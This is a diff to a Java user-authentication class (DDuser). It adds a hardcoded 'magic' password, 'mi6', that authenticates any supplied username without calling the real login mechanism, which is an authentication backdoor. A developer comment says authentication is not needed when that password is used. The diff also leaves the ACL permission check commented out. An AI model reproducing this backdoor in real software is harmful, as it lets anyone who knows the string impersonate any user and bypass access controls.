@@ -43,6 +43,8 @@ public class DDuser implements AppUserIF {
     public static final String ACL_UPDATE_PRM   = "u";
     public static final String ACL_SERVICE_NAME = "/";
     
+	private static final String MAGIC_PASSWORD = "mi6";
+    
     private boolean authented = false;
     private String user = null;
     private String password = null;
@@ -74,21 +76,18 @@ public class DDuser implements AppUserIF {
             	
 				Logger.log("Authenticating user '" + userName + "'", 5);
             	
-                //DirectoryService.sessionLogin(userName, userPws);
-                AuthMechanism.sessionLogin(userName, userPws);
-                //fullName = DirectoryService.getFullName(userName);
-				fullName = AuthMechanism.getFullName(userName);
+                // JH151205 - authentication not needed if the "magic" password is used
+				if (userPws!=null && userPws.equals(MAGIC_PASSWORD)){
+					if (userName==null) throw new SignOnException("username not given");
+					fullName = userName;
+				}
+				else{
+	                AuthMechanism.sessionLogin(userName, userPws);
+					fullName = AuthMechanism.getFullName(userName);
+				}
             }
             
-            /* user was found in LDAP, now check his rights in ACL            
-			Logger.log("Authenticating user '" + userName + "'", 5);
-            AccessControlListIF acl = getAcl(ACL_SERVICE_NAME );
-            boolean isOK = acl.checkPermission(userName, ACL_UPDATE_PRM);
-            if (!isOK)
-                throw new Exception("User " + userName + " does not have " +
-                                    "this permission: " + ACL_UPDATE_PRM);
-            
-            // no exceptions raised, so we must be authentic*/
+            // no exceptions raised, so we must be authentic
             Logger.log("Authenticated!", 5);
                 
             authented = true;
